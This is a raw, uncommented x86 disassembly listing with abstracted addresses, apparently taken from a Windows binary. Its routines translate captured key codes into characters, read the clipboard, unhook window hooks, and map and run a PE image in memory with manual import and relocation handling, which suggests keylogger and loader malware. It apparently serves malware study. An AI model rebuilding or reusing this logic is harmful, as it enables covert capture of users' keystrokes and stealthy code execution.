mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x8
je r-xdata
cmp ecx eax
ja r-xdata
cmp ecx eax
ja r-xdata
add eax 0xffffff46
cmp eax 0x24
ja r-xdata
add eax 0xffffff46
cmp eax 0x24
ja r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x6 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
mov eax 0xc0
cmp ecx eax
ja r-xdata
je r-xdata
mov eax 0xc0
cmp ecx eax
ja r-xdata
je r-xdata
mov eax [ esi + 0x3c ]
cmp eax 0x66
ja r-xdata
movzx eax [ eax + lookup_table_404dea ]
jmp [ eax * 4 + jump_table_404dba ]
movzx eax [ eax + lookup_table_404d95 ]
jmp [ eax * 4 + jump_table_404d65 ]
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x4
je r-xdata
sub ecx 0xdb
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
lea eax [ ecx - 0x30 ]
cmp eax 0x9
ja r-xdata
sub ecx 0xdb
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
lea eax [ ecx - 0x30 ]
cmp eax 0x9
ja r-xdata
sub eax 0x67
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x4 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x6
je r-xdata
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub ecx 0xbb
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
jmp [ eax * 4 + jump_table_404e37 ]
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub ecx 0xbb
je r-xdata
jmp [ eax * 4 + jump_table_404e0f ]
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x2e
je r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
mov edi r--data
jne r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x32
je r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
mov [ esi + 0x2f ] bl
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
jne r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
jne r-xdata
push eax
push edi
jmp r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x6
jne r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push edi
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
jne r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
jne r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub_404e5f
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x2e ] 0x1
jne r-xdata
xor ebx ebx
cmp [ esi + 0x2c ] bl
mov [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi + 0x3c ] 0x56
push 0x0
je r-xdata
cmp [ esi + 0x2d ] bl
jne r-xdata
cmp [ esi + 0x2d ] bl
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x54 ]
mov edi esp
mov ecx esi
push r--data
push eax
call sub_4050fc
push eax
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx esi
call sub_403a9a
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x34 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov edi esp
push eax
push [ esi + 0x3c ]
call [ toupper@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x3 ]
push eax
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx esi
call sub_403a9a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
mov eax [ esi + 0x3c ]
cmp eax 0xa0
je r-xdata
push [ esi + 0x3c ]
call [ toupper@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
mov eax [ esi + 0x3c ]
cmp eax 0xa0
je r-xdata
push [ esi + 0x3c ]
call [ tolower@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0xa1
je r-xdata
push eax
lea eax [ ebp - 0x1 ]
push 0x1
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
cmp eax 0xa1
je r-xdata
push eax
call [ tolower@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
call [ toupper@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
sub_404fde
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
cmp [ esi + 0x34 ] 0x10
jne r-xdata
pop esi
leave
retn
mov eax [ esi + 0x3c ]
sub eax 0x45
je r-xdata
push 0x1
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
sub eax 0x75
je r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
push 0x1
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x5
je r-xdata
push 0x1
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x1e
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub_40506e
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x3c ]
sub eax 0xa2
je r-xdata
push 0x1
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
jne r-xdata
pop esi
leave
retn
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
sub_4050fc
push ebp
mov ebp esp
push ecx
push esi
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
push r--data
push 0x1
call [ GetClipboardData@IAT ]
mov esi eax
call [ CloseClipboard@IAT ]
test esi esi
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0x4
sub_405142
push ebp
mov ebp esp
sub esp 0x24
test [ rw-data ] 0x1
push ebx
push esi
push edi
mov ebx ecx
mov edi rw-data
jne r-xdata
lea eax [ ebp - 0x14 ]
mov ecx ebx
push eax
call sub_4050fc
mov esi rw-data
lea eax [ ebp - 0x14 ]
push esi
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_405201
call sub_40fcba
pop ecx
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
sub esp 0x10
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx ebx
call sub_403a9a
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40520c
push ebx
push esi
mov esi ecx
lea ecx [ esi + 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
setne bl
add esi 0x60
push r--data
push esi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov al bl
pop esi
pop ebx
retn
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ RemoveDirectoryA@IAT ]
sub_40524e
push esi
push edi
mov edi [ TerminateThread@IAT ]
mov esi ecx
push 0x0
push sub_40382c
and [ esi + 0x38 ] 0x0
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx esi
call sub_40520c
pop edi
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi ] 0x0
push 0x0
push sub_40380c
call edi
sub_40528e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
je r-xdata
xor eax eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test edi edi
pop esi
je r-xdata
mov edi [ edi + 0x10c ]
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ edi ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
test eax eax
je r-xdata
inc eax
inc eax
inc esi
inc esi
test cl cl
jne r-xdata
pop edi
pop ebp
retn
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_4052ec
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x3c ]
push edi
lea eax [ eax + esi + 0x18 ]
mov eax [ eax + 0x38 ]
add eax 0x1000
push eax
push edi
push 0x4
push edi
push 0xffffffff
call [ CreateFileMappingA@IAT ]
push edi
push edi
push edi
mov ebx eax
push edi
push 0x2
push ebx
call [ MapViewOfFileEx@IAT ]
push ebx
mov edi eax
call [ CloseHandle@IAT ]
push edi
push esi
call sub_4054a7
push edi
call sub_40534b
push 0x1
push edi
call sub_405521
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40534b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
cmp [ ecx + eax + 0x74 ] 0x10
lea ebx [ ecx + eax + 0x18 ]
mov [ ebp - 0x8 ] ebx
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi eax
sub edi [ ebx + 0x1c ]
je r-xdata
mov esi [ ebx + 0x68 ]
add esi eax
cmp [ esi ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ ebx + 0x8c ] 0x0
je r-xdata
mov edi [ esi + 0xc ]
add edi eax
push edi
call sub_40528e
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
mov ecx [ ebx + 0x88 ]
add ecx eax
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
call [ LoadLibraryA@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ebx [ ecx + 0x4 ]
and [ ebp - 0x4 ] 0x0
sub ebx 0x8
lea esi [ ecx + 0x8 ]
shr ebx 0x1
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
add esi 0x14
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esi ]
mov eax [ ebp - 0x4 ]
mov ebx [ esi + 0x10 ]
add edi [ ebp + 0x8 ]
add ebx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] 0x123abc00
add ecx [ ecx + 0x4 ]
jmp r-xdata
movzx edx [ esi ]
mov eax edx
and eax 0xfff
add eax [ ecx ]
shr edx 0xc
add eax [ ebp + 0x8 ]
sub edx 0x0
je r-xdata
mov ebx [ ebp - 0x8 ]
test eax 0x80000000
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc esi
inc esi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] ebx
jl r-xdata
dec edx
je r-xdata
mov ecx [ ebp + 0x8 ]
add eax ecx
add eax 0x2
movzx eax ax
jmp r-xdata
mov edx edi
shr edx 0x10
add [ eax ] dx
dec edx
je r-xdata
mov [ ebx ] eax
add edi 0x4
add ebx 0x4
jmp r-xdata
push eax
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
add [ eax ] di
jmp r-xdata
dec edx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
add [ eax ] edi
jmp r-xdata
dec edx
jne r-xdata
movzx edx [ esi + 0x2 ]
add esi 0x2
lea edx [ edx + edi + 0x8000 ]
shr edx 0x10
or [ eax ] dx
jmp r-xdata
sub_4054a7
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
mov edi [ ebp + 0xc ]
mov esi eax
and [ ebp + 0x8 ] 0x0
lea edx [ eax + ecx ]
mov ecx [ eax + ecx + 0x54 ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0x3c ]
cmp [ edx + 0x6 ] 0x0
lea ecx [ eax + ecx + 0xf8 ]
jbe r-xdata
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn
lea edi [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edi
mov ecx [ edi - 0x4 ]
mov esi eax
add esi [ edi ]
mov edi [ edi - 0x8 ]
add edi [ ebp + 0xc ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
movzx ecx [ edx + 0x6 ]
add edi 0x28
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] edi
jl r-xdata
sub_405521
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x3c ]
add eax ecx
test [ eax + 0x17 ] 0x20
jne r-xdata
mov eax [ eax + 0x28 ]
push 0x0
push [ ebp + 0xc ]
add eax ecx
push ecx
call eax
pop ebp
retn
push 0x1
pop eax
pop ebp
retn
sub_405546
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
leave
retn
mov eax [ edx + 0x3c ]
cmp [ eax + edx + 0x74 ] 0x10
lea eax [ eax + edx + 0x18 ]
jb r-xdata
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x60 ]
shr ecx 0x10
add eax edx
test cx cx
jne r-xdata
mov ecx [ eax + 0x24 ]
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
mov edi [ eax + 0x20 ]
add edi edx
add ecx edx
cmp [ eax + 0x18 ] 0x0
jbe r-xdata
movzx ecx [ ebp + 0xc ]
sub ecx [ eax + 0x10 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ eax + 0x1c ]
lea eax [ eax + ecx * 4 ]
mov eax [ eax + edx ]
add eax edx
leave
retn
mov esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] esi
mov esi [ edi ]
add esi edx
sbb edx edx
sbb edx 0xffffffff
test dl dl
je r-xdata
movzx ecx [ ecx ]
add edi 0x4
inc ecx
inc ecx
inc [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
cmp edx [ eax + 0x18 ]
jb r-xdata
xor edx edx
jmp r-xdata
mov dl [ esi + 0x1 ]
mov [ ebp - 0x1 ] dl
cmp dl [ ebx + 0x1 ]
jne r-xdata
